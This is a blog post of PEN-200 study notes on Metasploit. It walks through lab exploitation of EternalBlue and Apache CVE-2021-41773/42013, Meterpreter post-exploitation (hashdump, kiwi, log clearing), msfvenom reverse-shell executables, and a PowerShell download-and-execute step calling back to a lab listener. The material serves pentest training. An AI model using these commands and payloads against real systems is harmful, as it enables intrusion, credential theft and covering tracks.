  76. <h1 class="blog-article-title">PEN-200 Module 20 — Metasploit With Restraint</h1>
  77. <p class="blog-article-meta">
  79. <span>Nov 18, 2023</span>

  94. <div class="blog-article-content">
  95. <h2>TLDR;</h2>
  96. <p>Metasploit is invaluable when you treat it like any other engineering tool: scripted, logged, and explained. This pass adds the concrete procedures captured in the labs.</p>
  97. <h3>Reconnaissance Modules</h3>
  98. <pre><code>use auxiliary/scanner/smb/smb_version
  99. set RHOSTS 192.168.119.0/24
  100. run
  101. ​
  102. use auxiliary/scanner/http/title
  103. set THREADS 20
  104. run
  105. </code></pre>
  106. <ul>
  107. <li>Export run results (<code>services -S smb -u</code>).</li>
  108. <li>Store workspace states: <code>workspace -a acme-internal</code> then <code>db_export -f xml acme-internal.xml</code> for backup.</li>
  109. </ul>
  110. <h3>Exploitation Workflow</h3>
  111. <ol>
  112. <li>Load module → <code>show options</code> → set <code>RHOSTS</code>, <code>RPORT</code>, <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>.</li>
  113. <li>Use <code>check</code> when available to confirm vulnerability.</li>
  114. <li>Enable logging: <code>spool logs/acme-msf.log</code> before <code>run</code>.</li>
  115. </ol>
  116. <pre><code>use exploit/windows/smb/ms17_010_eternalblue
  117. set RHOSTS 192.168.119.21
  118. set PAYLOAD windows/x64/meterpreter/reverse_https
  119. set LHOST 192.168.49.1
  120. set EXITFUNC thread
  121. run -j
  122. </code></pre>
  123. <ul>
  124. <li>Record session IDs, pivot hosts, and post modules executed.</li>
  125. </ul>
  126. <h3>Post-Exploitation Discipline</h3>
  127. <pre><code>sessions -i 1
  128. sysinfo
  129. getuid
  130. hashdump
  131. load kiwi
  132. ​
  133. run post/windows/gather/enum_logged_on_users
  134. run post/multi/gather/enum_domain_group_users GROUP=&quot;Domain Admins&quot;
  135. </code></pre>
  136. <ul>
  137. <li>Dump loot into organised directories (<code>loot</code>, <code>download</code>).</li>
  138. <li>Clean up (<code>clearev</code>, <code>migrate</code>, <code>sessions -k &lt;id&gt;</code>) once tasks complete.</li>
  139. </ul>
  140. <h3>Automation</h3>
  141. <ul>
  142. <li>Resource scripts (<code>msfconsole -r scripts/acme_exploit.rc</code>) to reproduce module setups. Include comments and <code>sleep</code> commands when waiting for services.</li>
  143. <li>Metasploit RPC for integration:</li>
  144. </ul>
  145. <pre><code>msfrpcd -P supersecret -S
  146. python3 metasploit_helper.py --module exploit/windows/http/struts2_content_type_ognl --rhosts 192.168.119.45
  147. </code></pre>
  148. <ul>
  149. <li>Always store resource files and automation scripts in version control with timestamps.</li>
  150. </ul>
  151. <h3>Operational Hygiene</h3>
  152. <ul>
  153. <li>Disable <code>autopwn</code>, default payloads, and <code>Meterpreter</code> features not explicitly required by rules of engagement.</li>
  154. <li>Log every module you run, including unsuccessful ones, for transparency.</li>
  155. </ul>
  156. <h3>Defensive Recommendations</h3>
  157. <ul>
  158. <li>Provide patch KB references, disabling SMBv1, enabling RDP network-level authentication, etc.</li>
  159. <li>Supply detection ideas: unusual <code>svchost</code> behaviour, creation of service <code>%TEMP%\random.exe</code>, outbound HTTPS to C2 IP.</li>
  160. </ul>
  161. <p>Metasploit should never be a black box. Script it, log it, and justify every module so the client gains confidence alongside the shell access you deliver.</p>
  162. <h2>Working Notes... In Graphic Detail...</h2>
  163. <h3>The Metasploit Framework</h3>
  164. <ul>
  165. <li>Getting Familiar with Metasploit.</li>
  166. <li>Using Metasploit Payloads.</li>
  167. <li>Performing Post-Exploitation with Metasploit.</li>
  168. <li>Automating Metasploit.</li>
  169. </ul>
  170. <h4>20.1 Getting Familiar with Metasploit</h4>
  171. <ul>
  172. <li>Setup and navigate Metasploit.</li>
  173. <li>Use auxiliary modules.</li>
  174. <li>Leverage exploit modules.</li>
  175. </ul>
  176. <h5>Setup and Work with MSF</h5>
  177. <p>MSF comes preinstalled on Kali but doesn&#39;t start its DB service in the default configuration. Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts. MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.</p>
  178. <p>We can start, create, and initialize the MSF DB with <code>msfdb init</code>.</p>
  179. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  180. └─$ sudo msfdb init
  181. [sudo] password for operator:
  182. [+] Starting database
  183. [+] Creating database user &#39;msf&#39;
  184. [+] Creating databases &#39;msf&#39;
  185. [+] Creating databases &#39;msf_test&#39;
  186. [+] Creating configuration file &#39;/usr/share/metasploit-framework/config/database.yml&#39;
  187. [+] Creating initial database schema
  188. </code></pre>
  189. <p>To enable the DB service at boot time we use <code>systemctl</code>.</p>
  190. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  191. └─$ sudo systemctl enable postgresql
  192. Synchronizing state of postgresql.service with SysV service script with /lib/systemd/systemd-sysv-install.
  193. Executing: /lib/systemd/systemd-sysv-install enable postgresql
  194. Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /lib/systemd/system/postgresql.service.
  195. </code></pre>
  196. <p>Launch the Metasploit CLI with <code>msfconsole</code>.</p>
  197. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  198. └─$ sudo msfconsole
  200. ### cowsay++
  201. ____________
  202. &lt; metasploit &gt;
  203. ------------
  204. \ ,__,
  205. \ (oo)____
  206. (__) )\
  207. ||--|| *
  208. ​
  209. ​
  210. =[ metasploit v6.3.31-dev ]
  211. + -- --=[ 2346 exploits - 1220 auxiliary - 413 post ]
  212. + -- --=[ 1388 payloads - 46 encoders - 11 nops ]
  213. + -- --=[ 9 evasion ]
  214. ​
  215. Metasploit tip: Search can apply complex filters such as
  216. search cve:2009 type:exploit, see all the filters
  217. with help search
  218. Metasploit Documentation: https://docs.metasploit.com/
  219. ​
  220. msf6 &gt;
  221. </code></pre>
  222. <ul>
  223. <li>Hide the banner and version info on start up with <code>-q</code></li>
  224. </ul>
  225. <p>Once the CLI has started we can verify the DB connectivity with <code>db_status</code>.</p>
  226. <pre><code>msf6 &gt; db_status
  227. [*] Connected to msf. Connection type: postgresql.
  228. </code></pre>
  229. <ul>
  230. <li>The DB is connected and we are all setup.</li>
  231. </ul>
  232. <p>The CLI of MSF provides numerous commands to navigate the framework, divided into <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">categories</a>. The categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands.</p>
  233. <p>We can list all available commands by entering <code>help</code>.</p>
  234. <pre><code>msf6 &gt; help

  363. ​
  364. msfconsole
  365. ==========
  366. ​
  367. `msfconsole` is the primary interface to Metasploit Framework. There is quite a
  368. lot that needs go here, please be patient and keep an eye on this space!
  369. ​
  370. Building ranges and lists
  371. -------------------------
  372. ​
  373. Many commands and options that take a list of things can use ranges to avoid
  374. having to manually list each desired thing. All ranges are inclusive.
  375. ​
  376. ##### Ranges of IDs
  377. ​
  378. Commands that take a list of IDs can use ranges to help. Individual IDs must be
  379. separated by a `,` (no space allowed) and ranges can be expressed with either
  380. `-` or `..`.
  381. ​
  382. ##### Ranges of IPs
  383. ​
  384. There are several ways to specify ranges of IP addresses that can be mixed
  385. together. The first way is a list of IPs separated by just a ` ` (ASCII space),
  386. with an optional `,`. The next way is two complete IP addresses in the form of
  387. `BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
  388. specifications may also be used, however the whole address must be given to
  389. Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
  390. Additionally, a netmask can be used in conjunction with a domain name to
  391. dynamically resolve which block to target. All these methods work for both IPv4
  392. and IPv6 addresses. IPv4 addresses can also be specified with special octet
  393. ranges from the [NMAP target
  394. specification](https://nmap.org/book/man-target-specification.html)
  395. ​
  396. ##### Examples
  397. ​
  398. Terminate the first sessions:
  399. ​
  400. sessions -k 1
  401. ​
  402. Stop some extra running jobs:
  403. ​
  404. jobs -k 2-6,7,8,11..15
  405. ​
  406. Check a set of IP addresses:
  407. ​
  408. check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
  409. ​
  410. Target a set of IPv6 hosts:
  411. ​
  412. set RHOSTS fe80::3990:0000/110, ::1-::f0f0
  413. ​
  414. Target a block from a resolved domain name:
  415. ​
  416. set RHOSTS www.example.test/24
  417. </code></pre>
  418. <p>Before jumping into operations in MSF, let&#39;s discuss workspaces. Assume we have performed a pentest and Metasploit stored all info about our target and infrastructure in the database. When we start the next pentest that info will still be in the DB, to avoid mixing assessment results we can use workspaces.</p>
  419. <p>The MSF <code>workspace</code> command lists all previously created workspaces, we can switch them by adding the name to the command. To create a new workspace provide the name as an argument to <code>-a</code>.</p>
  420. <p>Create a workspace name <code>pen200</code> for us to store the results of this section.</p>
  421. <pre><code>msf6 &gt; workspace
  422. * default
  423. msf6 &gt; workspace -a pen200
  424. [*] Added workspace: pen200
  425. [*] Workspace: pen200
  426. msf6 &gt; workspace
  427. default
  428. * pen200
  429. </code></pre>
  430. <p>Once created, Metasploit will use it as a current workspace.</p>
  431. <p>Let&#39;s populate the DB and familiarize ourselves with some of the Databse Backend Commands. We can scan BRUTE2 with <code>db_nmap</code> which is a wrapper to execute Nmap inside Metasploit and save the finding to the DB. The command syntax is identical to Nmap.</p>

  547. <ul>
  548. <li>If the DB service is running, Metasploit will log findings and info about discovered hosts, services, or credentials in a convenient, accessible database.</li>
  549. </ul>
  550. <p>To list all discovered hosts we can enter <code>hosts</code>.</p>

  592. <li>Quickly identify all hosts with a specific service running.</li>
  593. </ul>
  594. <p>When working with numerous target systems during an assessment, the Database Backend Commands are invaluable in identifying important info and discovering potential attack vectors. Results stored in the DB can also be used as input to modules, which we will discuss in the next section.</p>
  595. <p>Let&#39;s briefly review modules again, modules are used to perform tasks in Metasploit such as scanning or exploiting targets. The framework includes several thousand modules divided into categories.</p>
  596. <p>The categories are displayed on the splash screen summary and can be viewed with the <code>show -h</code> command.</p>
  597. <pre><code>msf6 &gt; show -h
  598. [*] Valid parameters for the &quot;show&quot; command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
  599. [*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
  600. </code></pre>
  601. <ul>
  602. <li>Shows the categories of the Metasploit modules.</li>
  603. </ul>
  604. <p>To activate a module we enter the <code>use</code> command with the module name. The modules all follow a common slash-delimeted hierarchal syntax.</p>
  605. <ul>
  606. <li><code>module type/os</code></li>
  607. <li><code>vendor</code></li>
  608. <li><code>app</code></li>
  609. <li><code>operation</code></li>
  610. <li><code>protocol/module name</code>
  611. This makes it easy to explore and use modules. We will explore auxiliary modules in the next section and then dive into exploit modules.</li>
  612. </ul>
  613. <h5>Auxiliary Modules</h5>
  614. <p>MSF includes hundreds of auxiliary modules, priving functionality such as proto enum, port scanning, fuzzing, sniffing, and more. Aux mods are useful for many tasks including info gathering (under the gather/hierarchy), and so on.</p>
  615. <p>There are too many to cover, but we will demonstrate the syntax and operation of two very common auxiliary modules. To list all aux mods, we can run the <code>show auxiliary</code> command. This presents us with a long list of all aux mods.</p>
  616. <pre><code>msf6 &gt; show auxiliary
  617. ​

  631. 8 auxiliary/admin/chromecast/chromecast_reset normal No Chromecast Factory Reset DoS
  632. 9 auxiliary/admin/chromecast/chromecast_youtube normal No Chromecast YouTube Remote Control

  716. </ul>
  717. <p>To activate a mod we enter <code>use</code> followed by the mod name or using the index provided from the search result. Using the later, activate the mod <code>auxiliary/scanner/smb/smb_version</code> with index <code>56</code>.</p>
  718. <pre><code>msf6 &gt; use 56
  719. msf6 auxiliary(scanner/smb/smb_version) &gt;
  720. </code></pre>
  721. <ul>
  722. <li>The command prompt indicates the active module.</li>
  723. </ul>
  724. <p>To get info about the current active mod we can enter <code>info</code>.</p>
  725. <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; info

  734. Spencer McIntyre
  735. Christophe De La Fuente

  744. om/docs/using-metasploit/basics/using-metasploit.
  745. html
  746. THREADS 1 yes The number of concurrent threads (max one per hos
  747. t)
  748. ​
  749. Description:
  750. Fingerprint and display version information about SMB servers. Protocol
  751. information and host operating system (if available) will be reported.
  752. Host operating system detection requires the remote server to support

  754. negotiation is only present in version 3.1.1.
  755. ​

  758. </code></pre>
  759. <ul>
  760. <li>The description provides info about the purpose of the module.</li>
  761. </ul>
  762. <p>The output shows the Basic options and args of the mod. We can also display options of a mod by entering <code>show options</code>. The options contain a column named <code>Required</code>, which specifies if a value needs to be set before launching a mod. Most Metasploit mods will set some of the options for us.</p>
  763. <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; show options
  764. ​
  765. Module options (auxiliary/scanner/smb/smb_version):
  766. ​
  767. Name Current Setting Required Description
  768. ---- --------------- -------- -----------
  769. RHOSTS yes The target host(s), see https://docs.metasploit.
  770. com/docs/using-metasploit/basics/using-metasploi
  771. t.html
  772. THREADS 1 yes The number of concurrent threads (max one per ho
  773. st)
  774. ​
  775. ​

  777. </code></pre>
  778. <ul>
  779. <li>Shows the option RHOSTS has no value set but is required by the module.</li>
  780. <li><em>To display all required, but not yet set, options we can use the command show missing.</em>.</li>
  781. </ul>
  782. <p>We can add or remove values from options with <code>set</code> and <code>unset</code>. We will <code>set</code> the value of RHOSTS to the IP of BRUTE2.</p>
  783. <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.197.202
  784. RHOSTS =&gt; 192.168.197.202
  785. </code></pre>
  786. <p>Instead of setting the value manually we can set RHOSTS automatically with DB results. We can set RHOSTS to all discovered hosts with open port 445 by entering <code>services</code>, the port number as <code>-p</code> arg, and <code>--rhosts</code> to set the results for this option. First we <code>unset</code> the manually set value.</p>
  787. <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; unset RHOSTS
  788. Unsetting RHOSTS...
  789. msf6 auxiliary(scanner/smb/smb_version) &gt; services -p 445 --rhosts
  790. Services
  791. ========
  792. ​
  793. host port proto name state info
  794. ---- ---- ----- ---- ----- ----
  795. 192.168.197.202 445 tcp microsoft-ds open
  796. ​
  797. RHOSTS =&gt; 192.168.197.202
  798. </code></pre>
  799. <ul>
  800. <li>Metasploit set the value for RHOSTS using DB results.</li>
  801. </ul>
  802. <p>With required options set, we can launch the mod by entering <code>run</code>.</p>
  803. <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; run
  804. ​
  805. [*] 192.168.197.202:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{ce3451ca-39b8-4812-a0d9-3e1ab8c7c379}) (authentication domain:BRUTE2)
  806. [*] 192.168.197.202: - Scanned 1 of 1 hosts (100% complete)
  807. [*] Auxiliary module execution completed
  808. </code></pre>
  809. <ul>
  810. <li>The output shows that the target system supports version 2/3 of SMB and prefers SMB 3.1.1.</li>
  811. </ul>
  812. <p>Next, we use the <code>vulns</code> command to show if Metasploit detected any vulnerabilites based on the results of this module.</p>

  823. -signing-in-windows-nt,
  824. URL-https://support.mic
  825. rosoft.com/en-us/help/8
  826. 87429/overview-of-serve
  827. r-message-block-signing

  951. <h5>Exploit Modules</h5>
  952. <p>Exploit modules contain exploit code for applications and services with known vulns. Metasploit contains over 2200 exploits (2023), each developed/tested, making MSF highly capable of exploiting a wide range of targets. The exploits are invoked in a similar manner to auxiliary modules.</p>
  953. <p>In this example we will access the target system, WEB18, using one of the included exploit modules. Assume we identified the target systems running Apache 2.4.49 web server, vulnerable to CVE-2021-42013. We&#39;ll attempt to use MSF and its exploit modules to get code execution.</p>

  1185. <p>Let&#39;s explore the concept of sessions and jobs in Metasploit. Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.</p>
  1186. <p>When we launched the exploit with <code>run</code>, a session was created and we obtained a shell. We can background the session with <code>Ctrl+Z</code> and prompt confirmation. Once sent to the background, we can use <code>sessions -l</code> to list all active sessions.</p>
  1187. <pre><code class="language-id">uid=1(daemon) gid=1(daemon) groups=1(daemon)

  1198. 192.168.205.16)
  1199. </code></pre>
  1200. <ul>
  1201. <li>Provides info about target and payload in use.</li>
  1202. <li>Making it easy to identify which session manages access to which target.</li>
  1203. </ul>
  1204. <p>Interact with a session again by passing the session ID to <code>sessions -i</code>.</p>
  1205. <pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -i 2
  1206. [*] Starting interaction with 2...
  1207. ​
  1208. uname -a

  1210. </code></pre>
  1211. <ul>
  1212. <li>We can enter commands into the interactive shell again.</li>
  1213. <li>Kill a session with <code>sessions -k</code> and the ID as arg. .</li>
  1214. </ul>
  1215. <p>Instead of launching an exploit and sending the resulting session to the background, we can use <code>run -j</code> to launch it in the context of a job. We&#39;ll still get the output of the mod, but need to interact with the session before we can access it.</p>
  1216. <p>In an assessment, we face many targets, making it easy to lose track of machines we already have access to. Using a framework like MSF helps us manage access to these systems. Eliminating the need to search through terminals for the correct session. Launch exploit modules with <code>run -j</code> to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.</p>
  1217. <p>MSF also stores info about targets, mod results, and vulns in the DB. Valuable for furhter steps in the pentest and reporting to the client.</p>
  1218. <h4>20.2 Using Metasploit Payloads</h4>
  1219. <ul>
  1220. <li>Understand the differences between staged and non-staged payloads.</li>
  1221. <li>Explore the Meterpreter payload.</li>
  1222. <li>Create executable payloads.</li>
  1223. </ul>
  1224. <h5>Staged vs Non-Staged Payloads</h5>
  1225. <p>Let&#39;s explore the difference between stages and non-staged payloads. Assume we have identified a buffer overflow vuln in a server. As we learned, we must be aware of the buffer size our shellcode will be stored in. If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.</p>
  1226. <p>The diff is subtle but important. A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task. Generally, these all-in-one payloads are more stable, but the size is larger than other types.</p>
  1227. <p>Staged payloads are sent in two parts. The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.</p>
  1228. <p>There are several situations in which we would prefer to use a staged payload instead of non-staged. A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller. AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.</p>
  1229. <p>With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter <code>show payloads</code>, getting a list of all compatible payloads.</p>

  1374. This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).

  1376. it can be used to execute arbitrary commands (Remote Command Execution).
  1377. This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

  1589. <h5>Meterpreter Payload</h5>
  1590. <p>We used a common TCP rev shell in the last section, which provided an interactive shell on the target system, but we only had the functionality of a regular command shell. Exploit frameworks often contain more advanced payloads providing features like file transfer, pivoting, and various other methods of interaction.</p>
  1591. <p>Metasploit contains the <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">Meterpreter</a> payload, a multi-function payload that can be dynamically extended at run-time. the payload resides entirely in memory on the target and its comms are encrypted by default. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and is available for various OS.</p>
  1592. <ul>
  1593. <li>Windows.</li>
  1594. <li>Linux.</li>
  1595. <li>MacOS.</li>
  1596. <li>Android.</li>
  1597. <li>And more.</li>

  1599. <p>Let&#39;s display all compatible payloads in the exploit module from the prior section and search for Meterpreter payloads. Activate a non-staged 64-bit Meterpreter TCP reverse shell payload and display its options.</p>

  1653. <p>We should not that all Meterpreter payloads are staged, however the output contains staged and non-staged payloads. The difference is in how Meterpreter payload is transferred to the target machine. Non-staged version includes all components required to launch a Meterpreter session while the staged version uses a seperate first stage to load these <a href="https://buffered.io/posts/staged-vs-stageless-handlers/">components</a>. Loading components over the network creates some traffic and may alert defensive systems. When our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, the non-staged Meterpreter payload comes in handy. We will use the non-staged version for the rest of the module.</p>

  1802. <li>We receive a promt a few seconds after launching the module.</li>
  1803. <li>Commands are divided into categories.</li>
  1804. <li>System Commands.</li>

  1808. <p>Let&#39;s get familiar with some of the Meterpreter commands, we start gathering info by entering <code>sysinfo</code> and <code>getuid</code>.</p>
  1809. <pre><code>meterpreter &gt; sysinfo
  1810. Computer : 172.29.0.2
  1811. OS : Ubuntu 20.04 (Linux 5.4.0-132-generic)
  1812. Architecture : x64
  1813. BuildTuple : x86_64-linux-musl
  1814. Meterpreter : x64/linux
  1815. meterpreter &gt; getuid
  1816. Server username: daemon
  1817. meterpreter &gt;
  1818. </code></pre>
  1819. <ul>
  1820. <li>Providing us with info about the target computer, OS, and the current user.</li>
  1821. </ul>
  1822. <p>As we learned, Metasploit uses sessions to manage access to different machines. When Metasploit interacts with a system in a session, it uses a concept named channels. We can start an interactive shell by entering <code>shell</code>, execute a command in the context of a channel, and background the channel the shell runs in. We use <code>Ctrl+Z</code> to background a channel.</p>
  1823. <pre><code>meterpreter &gt; shell
  1824. Process 135 created.
  1825. Channel 1 created.
  1826. id
  1827. uid=1(daemon) gid=1(daemon) groups=1(daemon)
  1828. ^Z
  1829. Background channel 1? [y/N] y
  1830. meterpreter &gt;
  1831. </code></pre>
  1832. <p>Next we start a second interactive shell, exec a command, and background the channel.</p>
  1833. <pre><code>meterpreter &gt; shell
  1834. Process 137 created.
  1835. Channel 2 created.
  1836. whoami
  1837. daemon
  1838. ^Z
  1839. Background channel 2? [y/N] y
  1840. meterpreter &gt;
  1841. </code></pre>
  1842. <p>Now we can list all active channels and interact with channel 1 again, enter <code>channel -l</code> to list, and <code>channel -i</code> with the channel ID as arg to interact.</p>
  1843. <pre><code>meterpreter &gt; channel -l
  1844. ​
  1845. Id Class Type
  1846. -- ----- ----
  1847. 1 3 stdapi_process
  1848. 2 3 stdapi_process
  1849. ​
  1850. meterpreter &gt; channel -i 1
  1851. Interacting with channel 1...
  1852. ​
  1853. id
  1854. uid=1(daemon) gid=1(daemon) groups=1(daemon)
  1855. </code></pre>
  1856. <ul>
  1857. <li>We have executed commands in the context of channel 1 again.</li>
  1858. <li>Using channels will help us to manage system access and perform post-exploitation ops.</li>
  1859. </ul>
  1860. <p>next we will use the <code>download</code> and <code>upload</code> commands from the File System Commands category to transfer files to and from the system. Let&#39;s review the commands in this category again.</p>

  1895. <p>Download <code>/etc/passwd</code> from the target machine to our Kali system. Change local dir to <code>/home/$USER/Downloads</code> first, enter the <code>download</code> command, with <code>/etc/passwd</code> as arg.</p>

  2048. <ul>
  2049. <li>Various events are handled until the Meterpreter session is established.</li>
  2050. <li>A monitoring defender would ony see regular HTTPS traffic.</li>
  2051. <li>If they were to check the address of the endpoint (Kali), they would get a HTTP 404.</li>
  2052. </ul>
  2053. <p>In a pentest, we can use this payload to improve our chances of bypassing security technologies and defenders. However, MSF is well known and detection rates of Meterpreter payloads are high. Therefore we should always attempt to obtain an initial foothold with a raw TCP shell and deploy Meterpreter shell once we have disabled or bypassed security technology.</p>
  2054. <h5>Executable Payloads</h5>
  2055. <p>Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example. Metasploit contains <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">msfvenom</a> as a standalone tool for generating these payloads. It provides standardized command options and various techniques to customize payloads.</p>
  2056. <p>To get familiar with msfvenom we&#39;ll create a mal Win bin that starts a raw TCP rev shell. Let&#39;s start by listing all payloads with <code>-l</code> and arg <code>payloads</code>. We will also pass <code>--platform</code> and <code>--arch</code>.</p>
  2057. <pre><code class="language-bash">kali@kali:~$ msfvenom -l payloads --platform windows --arch x64
  2058. ​
  2059. ...
  2060. windows/x64/shell/reverse_tcp Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
  2061. ...
  2062. windows/x64/shell_reverse_tcp Connect back to attacker and spawn a command shell (Windows x64)
  2063. ...
  2064. </code></pre>
  2065. <ul>
  2066. <li>We can choose between stages and non-staged payloads.</li>
  2067. <li>We will use non-staged payload first.</li>
  2068. </ul>
  2069. <p>Now we use the <code>-p</code> flag to set the payload, set <code>LHOST</code>, and <code>LPORT</code> to assign host and port for the rev shell conn, <code>-f</code> to set the output format to <code>exe</code>, and <code>-o</code> to specify the output file name.</p>
  2070. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  2071. └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
  2072. [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  2073. [-] No arch selected, selecting arch: x64 from the payload
  2074. No encoder specified, outputting raw payload
  2075. Payload size: 460 bytes
  2076. Final size of exe file: 7168 bytes
  2077. Saved as: nonstaged.exe
  2078. </code></pre>
  2079. <p>Now that we have created out mal bin, let&#39;s use it. First we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user <code>justin</code> and password <code>SuperS3cure1337#</code>. Then start PowerShell to transfer the file and exec.</p>
  2080. <pre><code class="language-powershell">PS C:\Users\justin&gt; iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
  2081. ​
  2082. PS C:\Users\justin&gt; .\nonstaged.exe
  2083. </code></pre>
  2084. <p>Once exec, we return to our Netcat listener.</p>
  2085. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  2086. └─$ nc -nvlp 443
  2087. listening on [any] 443 ...
  2088. connect to [192.168.45.182] from (UNKNOWN) [192.168.226.202] 60800
  2089. Microsoft Windows [Version 10.0.20348.169]
  2090. (c) Microsoft Corporation. All rights reserved.
  2091. ​
  2092. C:\Users\justin&gt;
  2093. </code></pre>
  2094. <p>Now we will use a staged payload to perform the same action. We again use msfvenom to create the staged TCP reverse shell payload.</p>
  2095. <pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
  2096. └─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe
  2097. [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  2098. [-] No arch selected, selecting arch: x64 from the payload
  2099. No encoder specified, outputting raw payload
  2100. Payload size: 510 bytes
  2101. Final size of exe file: 7168 bytes
  2102. Saved as: staged.exe
  2103. </code></pre>
  2104. <p>We received an incoming conn, but cannot exec any commands. This is because Netcat does not know how to handle the staged payload.</p>
  2105. <pre><code class="language-bash">kali@kali:~$ nc -nvlp 443
  2106. listening on [any] 443 ...
  2107. connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
  2108. whoami
  2109. </code></pre>
  2110. <p>To get a functional interactive command prompt we must use Metasploit&#39;s <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi/handler</a> module, which works for most staged, non-staged, and more advanced payloads.</p>
  2111. <p>In Metasploit, let&#39;s select the module with <code>use</code>, then specify the payload of our incoming conn, <code>windows/x64/shell/reverse_tcp</code> in this case. In addition, we set the opions for th payload. Enter the IP of our Kali machine as <code>LHOST</code> and port 443 for <code>LPORT</code>, then under <code>run</code> to launch the mod.</p>
  2112. <pre><code>msf6 &gt; workspace -a execpayloads

  2156. <p>With our listener running we can start the <code>staged.exe</code> on BRUTE2, our multi/handler receives the incoming staged payload and provides an interactive shell in the context of a <code>session</code>.</p>
  2157. <pre><code>msf6 exploit(multi/handler) &gt; run
  2158. ​
  2159. [*] Started reverse TCP handler on 192.168.45.182:443
  2160. [*] Sending stage (336 bytes) to 192.168.226.202
  2161. [*] Command shell session 1 opened (192.168.45.182:443 -&gt; 192.168.226.202:60810) at 2023-11-22 07:17:20 -0800
  2162. ​
  2163. ​

  2165. Microsoft Windows [Version 10.0.20348.169]
  2166. -----

  2175. <ul>
  2176. <li>For staged and advanced payloads, i.e. Meterpreter, we must use multi/handler.</li>
  2177. </ul>
  2178. <p>Using <code>run</code> without any args will block the command prompt until exe finishes or we background the session. As we learned previously, we can use <code>run -j</code> to start the listener in the background, allowing us to continue other work while we wait for the conn. We can use the <code>jobs</code> command to get a list of currently active jobs, like listeners waiting for conn.</p>
  2179. <p>Exit out session and restart with <code>run -j</code>, then list currently active jobs using <code>jobs</code>, once we exec staged.exe MSF will notify us that a new session was created.</p>
  2180. <pre><code>msf6 exploit(multi/handler) &gt; run -j

  2263. #### 20.3 Performing Post-Exploitation with Metasploit
  2265. - Use core Meterpreter post-exploitation features.

  2268. ​
  2269. ##### Core Meterpreter Post-Exploitation Features
  2270. ​
  2271. We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine. Apart from these, Meterpreter also contains numerous post-exploitation features.
  2272. ​
  2273. Let&#39;s explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version. Therefore we will explore these on Win target ITWK01. Let&#39;s assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.
  2274. ​
  2275. First, we&#39;ll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`

  2281. [-] No arch selected, selecting arch: x64 from the payload
  2282. No encoder specified, outputting raw payload
  2283. Payload size: 201820 bytes
  2284. Final size of exe file: 208384 bytes
  2285. Saved as: met.exe
  2286. </code></pre>
  2287. <p>Then we launch multi/handler, set options, and run.</p>

  2356. <p>Now that we have an active Meterpreter session on a Win target we can start exploring our port-exploitation commands/features.</p>
  2357. <p>The first post command we use is <code>idletime</code>, which displays how long a user has been idle. After obtaining basic info about the current user and OS, this should be one of our first commands as it indicated if the target sys is currently in use.</p>
  2358. <pre><code>
  2359. meterpreter &gt; getuid
  2360. Server username: ITWK01\luiza
  2361. meterpreter &gt; sysinfo
  2362. Computer : ITWK01
  2363. OS : Windows 10 (10.0 Build 22000).
  2364. Architecture : x64
